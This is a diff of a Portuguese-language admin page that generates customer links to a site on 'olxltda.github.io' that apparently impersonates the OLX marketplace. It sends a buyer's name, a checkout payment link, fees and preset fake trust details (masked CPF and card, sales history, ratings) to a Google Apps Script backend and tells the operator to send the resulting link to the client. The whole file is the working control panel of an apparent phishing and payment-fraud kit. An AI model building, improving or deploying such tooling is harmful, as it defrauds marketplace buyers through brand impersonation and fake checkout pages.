@@ -2,16 +2,123 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Admin - Gerador OLX (Original)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin - Gerador de Links OLX</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
-  body { background:#1e1e1e; color:#fff; font-family:sans-serif; padding:20px; }
-  form { max-width:500px; margin:0 auto; background:#2b2b2b; padding:30px; border-radius:12px; }
-  input { width:100%; padding:10px; margin:5px 0 15px; background:#3a3a3a; border:1px solid #444; color:#fff; border-radius:5px; }
-  button { width:100%; padding:15px; background:#00bfa5; border:none; color:#fff; font-weight:bold; cursor:pointer; }
-  .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); align-items:center; justify-content:center; }
-  .modal.active { display:flex; }
-  .modal-box { background:#222; padding:30px; border-radius:10px; text-align:center; border:1px solid #444; }
+  /* --- ESTILOS GERAIS --- */
+  body { background:#1e1e1e; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px; margin:0; }
+  
+  form { 
+    max-width:500px; margin:0 auto; background:#2b2b2b; padding:30px; 
+    border-radius:12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+  }
+  
+  h2 { text-align:center; color:#00bfa5; margin-top:0; }
+  
+  label { 
+    display:block; font-size: 12px; color: #ccc; 
+    text-transform: uppercase; font-weight: bold; margin-top: 15px; 
+  }
+  
+  input { 
+    width:100%; padding:12px; margin-top:5px; background:#3a3a3a; 
+    border:1px solid #444; color:#fff; border-radius:6px; box-sizing: border-box; 
+    font-size: 15px; transition: 0.3s;
+  }
+  input:focus { border-color: #00bfa5; outline: none; background: #444; }
+
+  /* Estilo para input desabilitado */
+  input:disabled {
+      cursor: wait;
+      color: #888;
+  }
+  
+  button#btnSalvar { 
+    width:100%; padding:15px; background:#00bfa5; border:none; 
+    border-radius:8px; color:#fff; font-weight:bold; cursor:pointer; 
+    font-size: 16px; margin-top: 25px; transition: 0.2s;
+  }
+  button#btnSalvar:hover { background:#009e8e; transform: translateY(-2px); }
+  button:disabled { background: #555; cursor: not-allowed; opacity: 0.7; }
+  
+  /* --- MODAL --- */
+  .modal { 
+    display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
+    background:rgba(0,0,0,0.9); align-items:center; justify-content:center; z-index: 1000;
+  }
+  .modal.active { display:flex; animation: fadeIn 0.3s; }
+  
+  .modal-box { 
+    background:#222; padding:30px; border-radius:10px; text-align:center; 
+    max-width:450px; width: 90%; border: 1px solid #444; box-shadow: 0 0 50px rgba(0,191,165,0.2);
+  }
+  
+  .link-display { 
+    background:#111; padding:15px; color:#00bfa5; word-break:break-all; 
+    margin:20px 0; border-radius:5px; font-family: monospace; border: 1px dashed #333; font-size: 13px;
+  }
+  
+  .actions-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px;
+  }
+
+  .btn-action { 
+    padding:12px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; width: 100%; font-size:14px;
+    display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none;
+  }
+  
+  .btn-copy { background:#fff; color:#000; }
+  .btn-copy:hover { background:#f0f0f0; }
+
+  .btn-view { background:#333; color:#fff; border: 1px solid #555; }
+  .btn-view:hover { background:#444; border-color: #fff; }
+
+  .btn-new { background:transparent; color:#888; border: 1px solid #444; width: 100%; margin-top: 5px;}
+  .btn-new:hover { color: #fff; border-color: #fff; }
+
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  /* --- NOVOS ESTILOS COLLAPSIBLE --- */
+  .toggle-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 15px;
+    margin: 20px -30px 0; /* Ajusta margem para cobrir a largura do form */
+    border-top: 1px solid #444;
+    border-bottom: 1px solid #444;
+    cursor: pointer;
+    background: #3a3a3a;
+    transition: background 0.2s;
+  }
+
+  .toggle-header:hover {
+    background: #444;
+  }
+  
+  .toggle-header p {
+    font-size: 12px;
+    color: #00bfa5; /* Cor do título para contraste */
+    letter-spacing: 1px;
+    font-weight: bold;
+    margin: 0;
+  }
+
+  #preset-fields-container {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.3s ease-in-out;
+  }
+
+  .toggle-icon {
+    transition: transform 0.3s ease;
+  }
+
+  .toggle-icon.rotated {
+    transform: rotate(180deg);
+    color: #00bfa5;
+  }
 </style>
 </head>
 <body>
@@ -19,74 +126,209 @@
 <form id="adminForm">
   <h2>Novo Pedido</h2>
   
-  <label>Comprador</label>
-  <input type="text" name="comprador" required>
+  <label>Nome do Comprador</label>
+  <input type="text" name="comprador" required placeholder="Nome completo">
   
-  <label>Link Pagamento</label>
-  <input type="text" name="linkPagamento" id="linkPagamento" placeholder="Carregando...">
+  <label>Link Pagamento (Checkout)</label>
+  <input type="text" name="linkPagamento" id="linkPagamento" placeholder="Carregando último link...">
 
-  <label>Valor</label>
-  <input type="text" name="valor" class="money" value="R$ 1.200,00">
+  <label>Taxa de Serviço</label>
+  <input type="text" name="taxa" class="money" placeholder="R$ 0,00">
+
+  <div id="preset-toggle" class="toggle-header">
+      <p>DADOS PRÉ-DEFINIDOS</p>
+      <i id="toggle-icon" class="fa-solid fa-chevron-down toggle-icon"></i>
+  </div>
   
-  <input type="hidden" name="prazo" value="10 minutos">
-  <input type="hidden" name="frete" value="Grátis">
-  <input type="hidden" name="tarifa" value="Inclusa">
-  
-  <button type="submit" id="btnSalvar">Gerar Link</button>
+  <div id="preset-fields-container" class="collapsed">
+    
+    <label>Valor Total</label>
+    <input type="text" name="valor" class="money" value="R$ 1.000,00">
+
+    <label>Prazo</label>
+    <input type="text" name="prazo" value="12 horas">
+
+    <label>Frete</label>
+    <input type="text" name="frete" class="money" value="R$ 0,00">
+
+    <label>Tarifa</label>
+    <input type="text" name="tarifa" class="money" value="R$ 0,00">
+
+    <label>CPF Mascarado</label>
+    <input type="text" name="cpf" value="406.***.***.01">
+
+    <label>Cartão Mascarado</label>
+    <input type="text" name="cartao" value="Mastercard 4588">
+
+    <label>Histórico de Vendas</label>
+    <input type="text" name="vendas" value="08 Vendas nos últimos 06 meses">
+
+    <label>Avaliação Atendimento</label>
+    <input type="text" name="atendimento" value="Avaliação 4.7/5.0">
+
+    <label>Taxa de Entrega</label>
+    <input type="text" name="entrega" value="Taxa de entregues no prazo 07/08">
+    
+  </div>
+  <button type="submit" id="btnSalvar">Gerar Link do Cliente</button>
 </form>
 
 <div class="modal" id="modalSuccess">
   <div class="modal-box">
-    <h3>Link Criado!</h3>
-    <div id="finalLink" style="color:#00bfa5; margin:15px 0;">...</div>
-    <button onclick="location.reload()">Novo</button>
+    <h3 style="color:#00bfa5; margin-top:0;">Link Gerado com Sucesso!</h3>
+    <p style="color:#aaa; font-size:14px;">Envie este link para o cliente.</p>
+    
+    <div class="link-display" id="finalLink">...</div>
+    
+    <div class="actions-grid">
+      <button class="btn-action btn-copy" id="btnCopy">
+        <i class="fa-regular fa-copy"></i> Copiar
+      </button>
+      <a href="#" target="_blank" class="btn-action btn-view" id="btnView">
+        <i class="fa-solid fa-external-link-alt"></i> Visualizar
+      </a>
+    </div>
+
+    <button class="btn-action btn-new" onclick="location.reload()">Criar Novo Pedido</button>
   </div>
 </div>
 
 <script>
-// ATUALIZE COM A NOVA URL DO DEPLOY AQUI
+// ========================================================
+// ⚙️ CONFIGURAÇÃO
+// ========================================================
+
 const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
-const CLIENTE_BASE_URL = 'https://olxltda.github.io/OLX/'; // URL do seu site cliente
+const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 
+
+// ========================================================
 
 const form = document.getElementById('adminForm');
-const inputLink = document.getElementById('linkPagamento');
+const modal = document.getElementById('modalSuccess');
+const linkDisplay = document.getElementById('finalLink');
+const btnSalvar = document.getElementById('btnSalvar');
+const btnCopy = document.getElementById('btnCopy');
+const btnView = document.getElementById('btnView');
+const inputLinkPagamento = document.getElementById('linkPagamento');
 
-// Carrega ultimo link
-document.addEventListener('DOMContentLoaded', async () => {
-  try {
-    const res = await fetch(`${BACKEND_URL}?action=lastlink`);
-    const json = await res.json();
-    if(json.link) inputLink.value = json.link;
-  } catch(e) { console.log('Erro ao carregar link', e); }
+// --- LÓGICA DE COLLAPSIBLE ---
+const toggleHeader = document.getElementById('preset-toggle');
+const fieldsContainer = document.getElementById('preset-fields-container');
+const toggleIcon = document.getElementById('toggle-icon');
+
+const togglePresetFields = () => {
+    const isExpanded = fieldsContainer.classList.toggle('expanded');
+    toggleIcon.classList.toggle('rotated');
+
+    if (isExpanded) {
+        fieldsContainer.style.maxHeight = fieldsContainer.scrollHeight + "px";
+    } else {
+        fieldsContainer.style.maxHeight = "0";
+    }
+};
+
+toggleHeader.addEventListener('click', togglePresetFields);
+
+
+// --- LÓGICA DE MÁSCARA DE MOEDA (R$) ---
+const moneyInputs = document.querySelectorAll('.money');
+const formatMoney = (value) => {
+  value = value.replace(/\D/g, "");
+  const amount = parseFloat(value) / 100;
+  if (isNaN(amount)) return "";
+  return amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+};
+moneyInputs.forEach(input => {
+  input.addEventListener('input', (e) => e.target.value = formatMoney(e.target.value));
+  
+  if(input.value) {
+    const cleanVal = input.value.replace(/\D/g, "");
+    if(cleanVal) input.value = formatMoney(cleanVal);
+  }
 });
 
+// --- RECUPERAR ÚLTIMO LINK DA PLANILHA (INÍCIO DO LOADING) ---
+document.addEventListener('DOMContentLoaded', async () => {
+  // Ações de Loading/Bloqueio
+  inputLinkPagamento.disabled = true;
+  inputLinkPagamento.placeholder = "⚙️ Carregando último link..."; 
+  inputLinkPagamento.style.color = '#00bfa5'; // Feedback visual de ativo/loading
+
+  try {
+    const res = await fetch(`${BACKEND_URL}?action=getLastLink`);
+    const json = await res.json();
+    
+    if(json.status === 'success' && json.link) {
+      inputLinkPagamento.value = json.link;
+      inputLinkPagamento.style.color = '#fff'; // Retorna a cor normal do texto
+    } else {
+      inputLinkPagamento.placeholder = "Nenhum link anterior encontrado. Insira um link.";
+    }
+  } catch(e) {
+    console.error("Erro ao buscar ultimo link", e);
+    inputLinkPagamento.placeholder = "❌ Erro ao carregar link. Insira manualmente.";
+    inputLinkPagamento.style.color = '#ff4d4d'; // Cor de erro
+  } finally {
+    // Finaliza o Loading/Bloqueio
+    inputLinkPagamento.disabled = false;
+  }
+});
+
+// --- ENVIO DO FORMULÁRIO ---
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
-  document.getElementById('btnSalvar').innerText = "Processando...";
   
+  btnSalvar.textContent = "Processando...";
+  btnSalvar.disabled = true;
+
   const data = {};
   new FormData(form).forEach((v, k) => data[k] = v);
-  
-  // O Backend original espera um POST direto para salvar
+
+  // Garante que o valor do input linkPagamento seja enviado
+  data.linkPagamento = inputLinkPagamento.value; 
+
   try {
     const res = await fetch(BACKEND_URL, {
       method: 'POST',
+      redirect: 'follow', 
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
       body: JSON.stringify(data)
     });
-    const json = await res.json();
     
-    if(json.status === 'success') {
-      const link = `${CLIENTE_BASE_URL}?id=${json.id}`;
-      document.getElementById('finalLink').innerText = link;
-      document.getElementById('modalSuccess').classList.add('active');
+    const json = await res.json();
+
+    if (json.status === 'success') {
+      const linkPronto = `${CLIENTE_URL}?id=${json.id}`;
+      
+      linkDisplay.textContent = linkPronto;
+      btnView.href = linkPronto; 
+      
+      modal.classList.add('active');
     } else {
-      alert('Erro: ' + json.message);
+      alert('❌ ERRO NO SERVIDOR: ' + json.message);
     }
-  } catch(err) {
-    alert('Erro de conexão');
+
+  } catch (err) {
+    console.error(err);
+    alert('Erro de conexão! O script não conseguiu responder.');
+  } finally {
+    btnSalvar.textContent = "Gerar Link do Cliente";
+    btnSalvar.disabled = false;
   }
-  document.getElementById('btnSalvar').innerText = "Gerar Link";
+});
+
+// Botão Copiar
+btnCopy.addEventListener('click', () => {
+  navigator.clipboard.writeText(linkDisplay.textContent);
+  const originalHTML = btnCopy.innerHTML;
+  btnCopy.innerHTML = `<i class="fa-solid fa-check"></i> Copiado!`;
+  btnCopy.style.background = "#4CAF50";
+  setTimeout(() => {
+    btnCopy.innerHTML = originalHTML;
+    btnCopy.style.background = "#fff";
+  }, 2000);
 });
 </script>
+
 </body>
-</html>
+  </html>
